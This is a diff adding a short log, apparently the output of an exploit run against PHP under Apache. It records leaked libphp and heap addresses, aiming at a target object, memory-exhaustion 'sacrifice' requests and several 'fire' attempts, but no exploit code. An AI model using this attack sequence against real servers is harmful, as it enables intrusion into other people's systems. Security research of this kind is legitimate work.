@@ -1,0 +1,18 @@
+=== oom98: self-scan aiming ===
+    probe basic:  R=7f6f4b400000 d=670f8 110110 | pid=17
+
+    libphp=0x7f6f4d133000
+    warm-up sent
+    sentinel at R=0x7f6f4ac00000 V=0x7f6f4ac01720 (pid R=7f6f4ac00000 d=1718 1720 1728 1730 1738 1740 1748 1750 1758 1760 1768 1770 | R=7f6f4ae00000 d=1718 1720 1728 1730 1738 1740 1748 1750 1758 1760 1768 1770 | R=7f6f4b400000 d=5d62d 5d635 5d63d 5d645)
+    OBJ=0x7f6f4ac01908 (value-off 488, nib=8 refc=1)
+    aim tile OK: BOFF=488 OBJ=0x7f6f4ac01908
+    sacrifice (200) b'<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 bytes exhausted (trie'
+    readback rc/ti @OBJ: pid=20 hex=
+  [f] fire0 (9210000): ERR b'<urlopen error [Errno 32] Broken pipe>'
+      readback rc/ti @OBJ: pid=40 hex=
+  [f] fire1 (9210004): 200 b'<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 b'
+      readback rc/ti @OBJ: pid=39 hex=
+  [f] fire2 (9210008): 200 b'<br />\n<b>Fatal error</b>:  Allowed memory size of 8388608 b'
+      readback rc/ti @OBJ: pid=48 hex=
+[restore]
+    restored: SAPI=apache2handler lim=8388608 vars=100000
